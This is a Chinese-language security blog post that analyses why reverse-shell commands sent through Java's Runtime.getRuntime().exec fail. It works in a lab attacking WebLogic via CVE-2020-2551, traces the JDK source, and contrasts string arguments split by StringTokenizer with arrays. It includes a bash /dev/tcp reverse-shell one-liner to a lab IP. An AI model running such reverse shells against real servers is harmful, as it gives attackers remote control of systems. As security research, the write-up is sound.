## 前言

遇到很多次在调用Runtime.getRuntime().exec方法进行弹shell的时候遇到的各种限制，都没好好的认识认识原理，这次主要是总一个总结和原理上的分析。

## 环境搭建

之后使用docker起一个具有反序列化的漏洞的Java服务(能够执行命令就行)。

之后开启调试的功能，

我这里直接就是用存在的weblogic的漏洞环境，直接通过发送T3协议数据包来触发反序列化漏洞。

## 起因

我这里使用的是`CVE-2020-2551`进行利用，

我们首先进行curl命令执行看看是否可以执行命令。

![image-20221124200610100.png](https://image.3001.net/images/20221125/1669351041_63804681ca747f58d616f.png!small)

接下来我们使用反弹shell的命令尝试

    
    
    bash -i >& /dev/tcp/192.168.153.1/8080 0>&1
    

![image-20221124201147389.png](https://image.3001.net/images/20221125/1669351048_6380468883457c2ffbd74.png!small)

按照正常的逻辑，应该会成功的啊？！

但是，并没有，如图：

![image-20221124201236376.png](https://image.3001.net/images/20221125/1669351054_6380468e87aacc417990c.png!small)

## 细节

我们跟进一下Runtime执行命令的源码。

因为对于linux和windows版本的JDK有一点小区别，所以我这里在项目依赖的位置将windows版的rt.jar包替换成了linux版的rt.jar包。

好了，言归正传，开始分析Runtime.getRuntime().exec执行命令的逻辑了。

![image-20221124211159273.png](https://image.3001.net/images/20221125/1669351061_63804695255f5ba7ac940.png!small)

在Runtime类中的exec方法存在有多个重载，大致可以分成传入的参数是一个字符串，或者是一个字符串数组进行命令执行。

### 字符串执行

我们首先来看看字符串作为参数的情况是怎么样的。

![image-20221124211416318.png](https://image.3001.net/images/20221125/1669351067_6380469b95f78c1d65196.png!small)

在这个方法中将会调用`this.exec((String)var1, (String[])null, (File)null)`方法继续进行调用。

![image-20221124211546340.png](https://image.3001.net/images/20221125/1669351074_638046a225cb38a21480b.png!small)

在这个方法中，首先是传入的命令不能为空，不然会抛出异常，之后主要是创建了一个`StringTokenizer`对类对象，传入的构造方法参数是我们需要执行的命令字符串。

从该方法的注释中也能够看出端倪来。

![image-20221124212333895.png](https://image.3001.net/images/20221125/1669351080_638046a8d0936d7c8292f.png!small)

> 使用通过调用 new StringTokenizer(command) 创建的 StringTokenizer
> 将命令字符串分解为标记，而无需进一步修改字符类别。分词器生成的分词然后以相同的顺序放置在新的字符串数组 cmdarray 中

所以我们可以跟进`StringTokenizer`类的构造方法中

![image-20221124213636478.png](https://image.3001.net/images/20221125/1669351090_638046b26ba2b945a48f2.png!small)

> 为指定的字符串构造一个字符串分词器。分词器使用默认的分隔符集，即“\t\n\r\f”：空格字符、制表符、换行符、回车符和换页符。

也就是使用这个类将命令字符串中跟据`\t\n\r\f`等字符来进行分割成一块块的数组，

主要的实现方法就是在exec方法中，首先调用`StringTokenizer#countTokens`来初始化cmdarray这个数组对象。

![image-20221124214254296.png](https://image.3001.net/images/20221125/1669351097_638046b990b3e5dad50cf.png!small)

主要是利用`skipDelimiters / scanToken`这两个方法来进行切片操作的

![image-20221124214341382.png](https://image.3001.net/images/20221125/1669351105_638046c142e649c86b046.png!small)

![image-20221124214351239.png](https://image.3001.net/images/20221125/1669351111_638046c7b3398c7548ad1.png!small)

之后就是调用`nextToken`方法来为前面初始化的数组进行赋值操作

![image-20221124214459545.png](https://image.3001.net/images/20221125/1669351116_638046cce4d472571df36.png!small)

在分割成了数组之后调用exec的重载方法`public Process exec(String[] cmdarray, String[] envp,
File dir)`

![image-20221124214738521.png](https://image.3001.net/images/20221125/1669351149_638046ed22cda9cba2822.png!small)

终归还是回到了`ProcessBuilder`类对象的创建来，在Java中另一种执行命令的方式就是通过调用`ProcessBuilder#start()`方法来执行命令。

这里进行了environment /
工作目录的初始化之后调用了`start`方法进行命令执行操作。![image-20221124220605915.png](https://image.3001.net/images/20221125/1669351157_638046f595edf57d7bc75.png!small)

这里获取的是命令字符串的分割之后的第一块，这个就是该命令执行的环境，比如`/bin/sh / /bin/bash`这些。

可以注意到在其后面有一个`System.getSecurityManager`方法的调用，这个就是通过调用`checkExec`方法来判断该次的命令调用是否合法，也是Java内置的一种安全管理。

![image-20221124220839808.png](https://image.3001.net/images/20221125/1669351164_638046fc2e95707a83862.png!small)

之后就是调用`ProcessImpl.start`方法进行执行了，

最后将会创建一个`UNIXProcess`类对象。

![image-20221124221109114.png](https://image.3001.net/images/20221125/1669351171_6380470301074542fc0cb.png!small)

传入的第一个参数是`/bin/bash`这种运行环境，第二个参数就是后面紧跟的需要执行的命令，

在这个类构造方法中，将会通过调用`forkAndExec`方法来创建了一个进程该方法返回了该进程的PID号。

 **总结**

使用Runtime.getRuntime().exec()方法执行命令的时候，会将传入的字符串命令，根据`\t\n\r\f`等分隔符进行分割，之后在进行命令的执行。

### 数组执行

如果传入的参数是一个数组对象，来到的具体代码就是在`public Process exec(String cmdarray[])`方法的调用中。

![image-20221124221755374.png](https://image.3001.net/images/20221125/1669351180_6380470c55e9309422f6b.png!small)

直接就来到了exec的重载方法`public Process exec(String[] cmdarray, String[] envp, File
dir)`

![image-20221124221913697.png](https://image.3001.net/images/20221125/1669351186_638047127359d7e4f8ba3.png!small)

在这个方法中，直接就将该数组对象传入的`ProcessBuilder`的构造方法中，之后调用`start`方法进行执行。

####  **总结**

使用exec的数组作为参数传入的重载方法，不同于使用字符串的重载方法进行命令执行，

具体到代码中就是少了一步通过创建了一个`StringTokenizer`类对象来自动进行命令的分割，在某些情况下，将会造成命令不能执行的情况，

数组方式是直接传入的自己已经分好块的命令数组进行命令执行，Java便不会自动将本应该在一起的命令分割开来造成错误。

